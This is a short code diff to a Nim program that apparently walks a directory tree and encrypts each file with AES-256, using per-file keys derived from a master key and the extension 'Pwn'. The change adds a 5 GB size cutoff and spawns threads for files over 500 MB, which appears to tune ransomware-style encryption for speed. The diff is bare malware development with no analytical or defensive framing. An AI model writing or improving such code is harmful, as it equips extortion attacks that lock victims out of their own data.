@@ -11,7 +11,8 @@ import nimcrypto
 const
   AES_256_KEY_SIZE = 32
   AES_BLOCK_SIZE = 16
-  FILE_SIZE = 1 * 1024 * 1024 * 1024
+  FILE_SIZE_LIMIT = 5 * 1024 * 1024 * 1024 # 5G
+  FILE_SIZE_THREAD = 500 * 1024 * 1024 # 500M
   EXT = "Pwn"
 
 type fcn = proc(key: seq[byte], x: string) {.gcsafe, thread.}
@@ -60,7 +61,9 @@ proc walk(path: string, master: seq[byte], act: fcn) =
       let
         fs  = getFileSize(entry)
         key = genKey(master, entry, fs)
-      if fs >= FILE_SIZE:
+      if fs >= FILE_SIZE_LIMIT:
+        return
+      if fs >= FILE_SIZE_THREAD:
         spawn act(key, entry)
       else:
         act(key, entry)
